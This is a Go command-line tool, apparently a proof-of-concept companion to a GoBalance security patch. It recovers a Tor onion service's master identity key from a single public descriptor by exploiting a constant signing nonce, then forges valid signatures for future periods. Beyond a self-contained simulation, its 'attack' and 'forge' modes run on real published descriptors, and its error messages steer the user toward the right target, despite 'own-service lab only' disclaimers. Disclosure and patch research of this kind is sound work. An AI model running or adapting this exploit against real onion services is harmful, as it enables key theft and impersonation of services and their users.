// GoBalance master-key recovery demo CLI
//
// Companion tool for the GoBalance security patch & PoC package. It turns the
// PoC's test-local attack math into a runnable demonstration:
//
//      gbdemo simulate                          self-contained demo, no Tor needed
//      gbdemo attack -d desc.txt -a <onion>     recover the master key from ONE
//                                               published descriptor (lab only!)
//      gbdemo forge  -d desc.txt -a <onion>     forge a signature for a future
//                                               time period with the recovered key

package main

import (
        "bytes"
        "crypto/ed25519"
        "crypto/rand"
        "crypto/sha512"
        "encoding/base32"
        "encoding/base64"
        "encoding/binary"
        "flag"
        "fmt"
        "math/big"
        "os"
        "strings"
        "time"

        "golang.org/x/crypto/sha3"

        vulnerable "gobalance/poc/vulnerable"
)

const kPrimeLabel = "Derive temporary signing key hash input"

const ed25519BasepointConst = "(15112221349535400772501151409588531511" +
        "454012693041857206046113283949847762202, " +
        "463168356949264781694283940034751631413" +
        "07993866256225615783033603165251855960)"

const blindString = "Derive temporary signing key\x00"
const timePeriodLengthMinutes = 1440 // 24h, gobalance GetTimePeriodLength()
const srvPhaseDurationMinutes = 720  // 12h, gobalance getSrvPhaseDuration()
const extHasSigningKey = 4           // gobalance hidden_service.go:106

func kPrimeConstant() []byte {
        d := sha512.Sum512([]byte(kPrimeLabel))
        return d[:32]
}

func blindingParam(identityPub []byte, timePeriod int64) []byte {
        toEnc := append([]byte{}, []byte(blindString)...)
        toEnc = append(toEnc, identityPub...)
        toEnc = append(toEnc, []byte(ed25519BasepointConst)...)
        var p8, l8 [8]byte
        binary.BigEndian.PutUint64(p8[:], uint64(timePeriod))
        binary.BigEndian.PutUint64(l8[:], uint64(timePeriodLengthMinutes))
        toEnc = append(toEnc, []byte("key-blind")...)
        toEnc = append(toEnc, p8[:]...)
        toEnc = append(toEnc, l8[:]...)
        sum := sha3.Sum256(toEnc)
        return sum[:]
}

func timePeriodFromUnix(ts int64) int64 {
        minutes := ts/60 - srvPhaseDurationMinutes
        return minutes / timePeriodLengthMinutes
}

func onionPubKey(addr string) ([]byte, error) {
        addr = strings.ToLower(strings.TrimSpace(addr))
        addr = strings.TrimSuffix(addr, ".onion")
        if len(addr) != 56 {
                return nil, fmt.Errorf("onion address must be 56 base32 chars (with or without .onion), got %d", len(addr))
        }
        raw, err := base32.StdEncoding.DecodeString(strings.ToUpper(addr))
        if err != nil {
                return nil, fmt.Errorf("invalid base32 in onion address: %w", err)
        }
        if len(raw) != 35 {
                return nil, fmt.Errorf("decoded address is %d bytes, want 35", len(raw))
        }
        pub, sum, version := raw[:32], raw[32:34], raw[34]
        if version != 0x03 {
                return nil, fmt.Errorf("address version byte is %#x, want 0x03", version)
        }
        h := sha3.New256()
        h.Write([]byte(".onion checksum"))
        h.Write(pub)
        h.Write([]byte{0x03})
        if !bytes.Equal(h.Sum(nil)[:2], sum) {
                return nil, fmt.Errorf("onion checksum mismatch — not a valid v3 onion address")
        }
        return pub, nil
}


type parsedCert struct {
        signedMsg        []byte // M: the exact bytes the blinded key signed (pack() w/o signature)
        blindedPub       []byte // A': signing key carried in the HasSigningKey extension
        sig              []byte // R||S, the blinded signature
        expirationHours  uint32
        certType, nExts  uint8
        signingKeyPubRaw []byte // descriptor signing key (the cert "key" field)
}

func extractCertBase64(descText string) (string, error) {
        var b strings.Builder
        inCert := false
        for _, raw := range strings.Split(descText, "\n") {
                ln := strings.TrimSpace(raw)
                switch {
                case strings.HasPrefix(ln, "descriptor-signing-key-cert"):
                        inCert = true
                        rest := strings.TrimSpace(strings.TrimPrefix(ln, "descriptor-signing-key-cert"))
                        if rest != "" && !strings.HasPrefix(rest, "-----BEGIN") {
                                b.WriteString(rest) // bare base64 on the same line
                        }
                case inCert:
                        if strings.HasPrefix(ln, "-----BEGIN ED25519 CERT") || ln == "" {
                                continue
                        }
                        if strings.HasPrefix(ln, "-----END ED25519 CERT") || strings.Contains(ln, " ") {

                                inCert = false
                                if strings.HasPrefix(ln, "-----END") {
                                        break
                                }
                                continue
                        }
                        b.WriteString(ln)
                }
        }
        s := b.String()
        if s == "" {
                return "", fmt.Errorf("no descriptor-signing-key-cert block found")
        }
        if m := len(s) % 4; m != 0 {
                s += strings.Repeat("=", 4-m) // gobalance strips base64 padding on publish
        }
        return s, nil
}


func unpackCert(raw []byte) (*parsedCert, error) {
        const hdr, sigLen, keyLen = 40, 64, 32
        if len(raw) < hdr+sigLen {
                return nil, fmt.Errorf("certificate too short: %d bytes", len(raw))
        }
        if raw[0] != 1 {
                return nil, fmt.Errorf("unsupported certificate version %d", raw[0])
        }
        body, sig := raw[:len(raw)-sigLen], raw[len(raw)-sigLen:]
        c := &parsedCert{
                certType:         body[1],
                expirationHours:  binary.BigEndian.Uint32(body[2:6]),
                signingKeyPubRaw: body[7 : 7+keyLen],
                nExts:            body[39],
                sig:              sig,
        }
        off := hdr
        for i := 0; i < int(c.nExts); i++ {
                if off+4 > len(body) {
                        return nil, fmt.Errorf("truncated extension header at offset %d", off)
                }
                dataSize := int(binary.BigEndian.Uint16(body[off : off+2]))
                extType := body[off+2]
                if off+4+dataSize > len(body) {
                        return nil, fmt.Errorf("extension data overruns certificate body")
                }
                data := body[off+4 : off+4+dataSize]
                if extType == extHasSigningKey && dataSize == 32 {
                        c.blindedPub = append([]byte{}, data...)
                }
                off += 4 + dataSize
        }
        if c.blindedPub == nil {
                return nil, fmt.Errorf("certificate carries no HasSigningKey (type %d) extension", extHasSigningKey)
        }
        c.signedMsg = body[:off] // EXACTLY what the blinded key signed
        return c, nil
}

func parseDescriptorFile(path string) (*parsedCert, error) {
        raw, err := os.ReadFile(path)
        if err != nil {
                return nil, err
        }
        b64, err := extractCertBase64(string(raw))
        if err != nil {
                return nil, err
        }
        der, err := base64.StdEncoding.DecodeString(b64)
        if err != nil {
                return nil, fmt.Errorf("certificate base64 decode failed: %w", err)
        }
        return unpackCert(der)
}


func findBlindingPeriod(identityPub, blindedPub []byte, certExpHours uint32) (int64, []byte, error) {
        pExp := timePeriodFromUnix(int64(certExpHours) * 3600)
        pNow := timePeriodFromUnix(time.Now().Unix())
        seen := map[int64]bool{}
        var candidates []int64
        add := func(from, to int64) {
                for p := from; p <= to; p++ {
                        if p > 0 && !seen[p] {
                                seen[p] = true
                                candidates = append(candidates, p)
                        }
                }
        }
        add(pExp-2, pExp+2)   // window around the cert's own expiration (publish time + 54h)
        add(pNow-366, pNow+1) // fallback: the last ~year and the next period
        for _, p := range candidates {
                param := blindingParam(identityPub, p)
                if bytes.Equal(vulnerable.BlindedPubkey(identityPub, param), blindedPub) {
                        return p, param, nil
                }
        }
        return 0, nil, fmt.Errorf("no time period reproduces the blinded key (descriptor not published via the vulnerable tor-format path, or content tampered)")
}

func runAttack(descPath, onionAddr string) (master *big.Int, pc *parsedCert, period int64, param, identityPub []byte, err error) {
        fmt.Println("== GoBalance master-key recovery demo (own-service lab use only) ==")

        fmt.Printf("\n[1/5] onion address    : %s.onion\n", strings.ToLower(strings.TrimSuffix(strings.ToLower(strings.TrimSpace(onionAddr)), ".onion")))
        identityPub, err = onionPubKey(onionAddr)
        if err != nil {
                return nil, nil, 0, nil, nil, err
        }
        fmt.Printf("      identity pubkey  : %x (checksum OK)\n", identityPub)

        fmt.Println("\n[2/5] parsing descriptor (the cert is PUBLIC data — every Tor client downloads it)")
        pc, err = parseDescriptorFile(descPath)
        if err != nil {
                return nil, nil, 0, nil, nil, err
        }
        fmt.Printf("      cert type %d, %d extension(s), expiration = %d epoch-hours\n", pc.certType, pc.nExts, pc.expirationHours)
        fmt.Printf("      blinded pubkey A': %x\n", pc.blindedPub)
        fmt.Printf("      signed message M : %d bytes, signature R||S: %d bytes\n", len(pc.signedMsg), len(pc.sig))

        fmt.Println("\n[3/5] nonce prefix kPrime = SHA512(\"" + kPrimeLabel + "\")[:32]")
        fmt.Printf("      kPrime (PUBLIC CONSTANT, no secret involved): %x\n", kPrimeConstant())

        fmt.Println("\n[4/5] locating time period (reproduce the blinding parameter from public inputs)")
        period, param, err = findBlindingPeriod(identityPub, pc.blindedPub, pc.expirationHours)
        if err != nil {
                return nil, nil, 0, nil, nil, err
        }
        fmt.Printf("      time period %d: blinding param = %x\n", period, param)
        fmt.Println("      blinded pubkey reproduced from (identity pub + period) — MATCH")

        fmt.Println("\n[5/5] recovery: r = H(kPrime||M);  s' = (S - r)*H(R||A'||M)^-1 mod L;  a = s'*mult^-1 mod L")
        sPrime := vulnerable.RecoverBlindedScalar(pc.signedMsg, pc.sig, pc.blindedPub)
        master = vulnerable.UnblindScalar(sPrime, param)
        fmt.Printf("      blinded scalar s' = %x\n", sPrime)
        fmt.Printf("      MASTER SCALAR a   = %x\n", master)
        if bytes.Equal(vulnerable.PubFromScalar(master), identityPub) {
                fmt.Println("      VERIFY: [a]B == identity pubkey of the onion address  >>> MASTER KEY RECOVERED FROM ONE PUBLIC DESCRIPTOR <<<")
                return master, pc, period, param, identityPub, nil
        }
        // Verification ladder — distinguishes WHY recovery failed so the operator
        // can fix the lab setup instead of guessing:
        //   [s']B != A'  → the signing nonce was NOT the public constant (safe path)
        //   [s']B == A' but [a]B != A → blinding multiplier mismatch (unlikely)
        if bytes.Equal(vulnerable.PubFromScalar(sPrime), pc.blindedPub) {
                return nil, nil, 0, nil, nil, fmt.Errorf("recovered scalar does NOT reproduce the onion pubkey — honest failure\n" +
                        "      diagnostics: [s']B == A' but [a]B != A — the blinding multiplier is wrong\n" +
                        "      (unlikely: period matched A'). Please report this output.")
        }
        return nil, nil, 0, nil, nil, fmt.Errorf("recovered scalar does NOT reproduce the onion pubkey — honest failure\n" +
                "      diagnostics: [s']B != A' — the signing nonce was NOT the public constant,\n" +
                "      i.e. this descriptor was NOT signed via the vulnerable tor-format path.\n" +
                "      MOST LIKELY CAUSES (in the order usually seen):\n" +
                "        1. WRONG TARGET — the descriptor belongs to a backend INSTANCE (real Tor\n" +
                "           signs those correctly) or to a different onion than -a. Attack the\n" +
                "           MASTER address's descriptor: the one the dispatcher publishes for\n" +
                "           the onion users actually visit.\n" +
                "        2. PEM MASTER KEY — the dispatcher key file is a PEM/PKCS8 text file\n" +
                "           (the kind 'gobalance generate-config' writes); that takes the SAFE\n" +
                "           signing path by design. Convert it:\n" +
                "           python3 tools/pem2tor.py master.key master_tor.key  (address is\n" +
                "           preserved), point config.yaml 'key:' at it, restart gobalance.\n" +
                "        3. STALE DESCRIPTOR — captured before the key switch. Convert first,\n" +
                "           restart, then fetch a FRESH descriptor (tools/get_desc.py).")
}

func runForge(master *big.Int, identityPub []byte, period, relPeriod int64, msg []byte) error {
        target := period + relPeriod
        param2 := blindingParam(identityPub, target)
        bp2 := vulnerable.BlindedPubkey(identityPub, param2)
        forged := vulnerable.ForgeBlindedSignature(msg, master, bp2, param2)
        fmt.Printf("\n[FORGE] target time period %d (descriptor period %d + %d)\n", target, period, relPeriod)
        fmt.Printf("        blinded pubkey    : %x\n", bp2)
        fmt.Printf("        message           : %q\n", msg)
        fmt.Printf("        forged signature  : %x\n", forged)
        if ed25519.Verify(bp2, msg, forged) {
                fmt.Println("        VERIFY: standard ed25519 verification under the blinded pubkey = TRUE")
                fmt.Println("        => the recovered key signs VALID descriptors for ANY future period (takeover primitive)")
                return nil
        }
        return fmt.Errorf("forged signature failed verification")
}


func runSimulate() error {
        fmt.Println("== GoBalance master-key recovery demo — SELF-CONTAINED (local throwaway keys) ==")

        _, seed, _ := ed25519.GenerateKey(rand.Reader)
        d := sha512.Sum512(seed)
        a := append([]byte{}, d[:32]...)
        a[0] &= 248
        a[31] &= 63
        a[31] |= 64
        torKey := append(append([]byte{}, a...), d[32:]...)
        identityPub := vulnerable.PubFromScalar(vulnerable.DecodeIntBig(a))
        fmt.Println("\n[victim] throwaway tor-format key generated locally")
        fmt.Printf("         identity pubkey : %x\n", identityPub)

        nonce1 := bytes.Repeat([]byte{0xAB}, 32) // stand-in for the period-1 blinding param
        nonce2 := bytes.Repeat([]byte{0xCD}, 32) // stand-in for the period-2 blinding param
        bp1 := vulnerable.BlindedPubkey(identityPub, nonce1)
        bp2 := vulnerable.BlindedPubkey(identityPub, nonce2)
        msg1 := []byte("-----BEGIN ED25519 CERT----- period1 cert bytes -----END-----")
        msg2 := []byte("-----BEGIN ED25519 CERT----- period2 cert bytes -----END-----")

        sig1 := vulnerable.BlindedSignWithTorKey(msg1, torKey, bp1, nonce1)
        sig2Real := vulnerable.BlindedSignWithTorKey(msg2, torKey, bp2, nonce2)
        fmt.Println("\n[victim] period-1 descriptor published with a blind-signed cert (vulnerable code path)")

        fmt.Println("\n[attack] the attacker holds ONLY public data: the descriptor cert (M, A', R||S)")
        sPrime := vulnerable.RecoverBlindedScalar(msg1, sig1, bp1)
        master := vulnerable.UnblindScalar(sPrime, nonce1)
        fmt.Printf("         blinded scalar s' = %x\n", sPrime)
        fmt.Printf("         MASTER SCALAR a   = %x\n", master)
        if !bytes.Equal(vulnerable.PubFromScalar(master), identityPub) {
                return fmt.Errorf("internal error: recovery verification failed")
        }
        fmt.Println("         VERIFY: [a]B == victim identity pubkey  >>> MASTER KEY RECOVERED FROM ONE DESCRIPTOR <<<")

        forged2 := vulnerable.ForgeBlindedSignature(msg2, master, bp2, nonce2)
        if !bytes.Equal(forged2, sig2Real) {
                return fmt.Errorf("internal error: forged signature differs from the victim's real signature")
        }
        fmt.Println("\n[forge]  period-2 signature forged with the recovered key:")
        fmt.Printf("         forged : %x\n", forged2)
        fmt.Printf("         victim : %x\n", sig2Real)
        fmt.Println("         VERIFY: byte-for-byte identical to what the victim's key produces")
        fmt.Println("         => attacker can impersonate this onion for ANY future period")
        fmt.Println("\n(all keys above were generated locally for this run — safe to discard)")
        return nil
}


func usage() {
        fmt.Fprintln(os.Stderr, `gbdemo — GoBalance master-key recovery demo (defensive education; own-service lab only)

Usage:
  gbdemo simulate
      Self-contained demo on locally generated throwaway keys. No Tor, no files.

  gbdemo attack -d <descriptor.txt> -a <56-char onion address>
      Recover the master identity key from ONE published descriptor.
      Pure math on public data — no server interaction.

  gbdemo forge -d <descriptor.txt> -a <onion> [-period N] [-m "message"]
      Forge a signature for N periods after the descriptor's period and
      verify it as standard ed25519 under the future blinded key.

Only run against hidden services you own.`)
        os.Exit(2)
}

func fail(err error) {
        fmt.Fprintf(os.Stderr, "\nERROR: %v\n", err)
        os.Exit(1)
}

func main() {
        if len(os.Args) < 2 {
                usage()
        }
        switch os.Args[1] {
        case "simulate":
                if err := runSimulate(); err != nil {
                        fail(err)
                }
        case "attack":
                fs := flag.NewFlagSet("attack", flag.ExitOnError)
                desc := fs.String("d", "", "path to the published descriptor text file")
                addr := fs.String("a", "", "victim onion address (56 chars, .onion optional)")
                _ = fs.Parse(os.Args[2:])
                if *desc == "" || *addr == "" {
                        usage()
                }
                if _, _, _, _, _, err := runAttack(*desc, *addr); err != nil {
                        fail(err)
                }
        case "forge":
                fs := flag.NewFlagSet("forge", flag.ExitOnError)
                desc := fs.String("d", "", "path to the published descriptor text file")
                addr := fs.String("a", "", "victim onion address")
                rel := fs.Int64("period", 1, "periods AFTER the descriptor's period to forge for")
                msg := fs.String("m", "gbdemo: forged descriptor cert (own-service demo)", "message/cert body to sign")
                _ = fs.Parse(os.Args[2:])
                if *desc == "" || *addr == "" {
                        usage()
                }
                master, _, period, _, identityPub, err := runAttack(*desc, *addr)
                if err != nil {
                        fail(err)
                }
                if err := runForge(master, identityPub, period, *rel, []byte(*msg)); err != nil {
                        fail(err)
                }
        default:
                usage()
        }
}
